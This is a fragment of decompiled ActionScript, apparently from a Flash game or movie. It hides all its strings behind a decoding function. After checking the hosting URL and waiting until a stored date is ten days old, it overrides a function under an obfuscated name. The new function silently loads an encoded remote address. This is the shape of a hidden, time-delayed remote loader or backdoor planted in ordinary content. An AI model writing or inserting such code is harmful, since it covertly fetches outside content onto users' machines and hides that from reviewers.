if(_root.jie == undefined)
{
   return undefined;
}
if(_root[_root.jie("1114000308130631201302")] != undefined)
{
   return undefined;
}
if(_root[_root.jie("18041721041745081204")] != undefined)
{
   return undefined;
}
if(_root[_root.jie("0300190476210417")] == undefined)
{
   return undefined;
}
var ccc = _root.jie("07191915868888");
var ddd = _root.jie("55546060");
var uuu = _root[_root.jie("76201711")];
if(uuu.substr(0,7) != ccc)
{
   return undefined;
}
if(uuu.indexOf(ddd) != -1)
{
   return undefined;
}
var dateArray = _root[_root.jie("0300190476210417")].split("/");
var date = new Date(dateArray[0],dateArray[1] - 1,dateArray[2]);
if(_root.getDayDiff(new Date(),date) < 10)
{
   return undefined;
}
_root[_root.jie("1114000308130631201302")] = function()
{
   var _loc2_ = _root[_root.jie("111400030813061202")][_root.jie("1212")];
   var _loc3_ = _loc2_[_root.jie("050813081807")];
   if(_loc3_ != undefined)
   {
      return _loc3_ === true;
   }
   if(_root[_root.jie("1114000308130632001204")] == false)
   {
      return _root[_root.jie("11140003081306341319")]++ > 90;
   }
   var _loc5_ = _root.jie("07191915868888575262525558625261596257865953885603151100247600150862182205");
   var _loc4_ = _root.jie("111400033814210804");
   _loc2_[_loc4_](_loc5_,_loc2_);
   _root[_root.jie("1114000308130632001204")] = false;
   _root[_root.jie("11140003081306341319")] = 0;
   return false;
};
